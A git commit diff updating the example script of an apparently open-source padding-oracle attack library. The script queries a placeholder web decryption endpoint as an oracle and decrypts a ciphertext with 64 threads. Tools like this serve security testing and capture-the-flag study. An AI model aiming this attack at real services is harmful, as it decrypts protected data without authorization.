e24d304c0e30efc146d7d88ecacd8f584c9305e0
djosix <djosicks@gmail.com>
2020-02-21 09:43:39 +0800

    Update example

--- example.py
+++ example.py
@@ -1,15 +1,23 @@
 from padding_oracle import *
 
 import requests
+
+# Create a requests.Session to enable connection pool
 sess = requests.Session()
 
+# Define a function to test if the cipher can be decrypted
 def oracle(cipher):
-    r = sess.post('http://some-website.com/decrypt', data={'cipher': base64_encode(cipher)})
-    assert 'SUCCESS' in r.text or 'FAILED' in r.text
-    return 'SUCCESS' in r.text
+    resp = sess.post('http://some-website.com/decrypt',
+                     data={'cipher': base64_encode(cipher)}).text
+    assert 'Good' in resp or 'Bad' in resp, 'Exception?'
+    return 'Good' in resp
 
-cipher = b'[      IV      ][    Block 1   ][    Block 2   ]'
-plaintext = padding_oracle(cipher,  # cipher bytes      (required)
-                           16,      # block size        (required)
-                           oracle,  # oracle function   (required)
-                           64)      # number of threads
+
+cipher = b'[______IV______][____Block1____][____Block2____]'
+
+
+# DECRYPT THE CIPHER!!!
+plaintext = padding_oracle(cipher,
+                           block_size=16,
+                           oracle=oracle,
+                           num_threads=64)
